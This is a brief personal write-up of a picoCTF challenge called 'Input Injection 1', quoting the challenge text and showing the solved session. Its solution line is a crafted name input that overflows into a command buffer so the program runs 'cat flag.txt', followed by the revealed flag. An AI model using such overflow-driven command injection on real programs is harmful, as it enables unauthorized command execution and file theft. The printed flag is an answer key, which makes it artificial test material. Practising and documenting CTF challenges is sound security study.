---
title: Input Injection
category: Hello
difficulty: Hard
date: 2026-09-03
tags:

summary: Uwuga
status: Ongoing
---

# Input Injection 1

## 1. Challenge Description

> [!quote] A friendly program wants to greet you… but its goodbye might say more than it should. Can you convince it to reveal the flag? connect to the challenge instance `nc <ip_address> <port>`. You can Download the program file [here](https://challenge-files.picoctf.net/c_amiable_citadel/bedd848cf45bd7b42af4a45831ad58190255c0e569df35640cdb63b151a62753/vuln)and source [code](https://challenge-files.picoctf.net/c_amiable_citadel/bedd848cf45bd7b42af4a45831ad58190255c0e569df35640cdb63b151a62753/vuln.c)

### Solution
```
$ nc <ip_address> <port>
What is your name?
cielangelo cat flag.txt
Goodbye, cielangelo cat flag.txt!
picoCTF{0v3rfl0w_c0mm4nd_0e1de30d}  
```
##  The Flag

> [!SUCCESS] Flag `picoCTF{0v3rfl0w_c0mm4nd_0e1de30d}`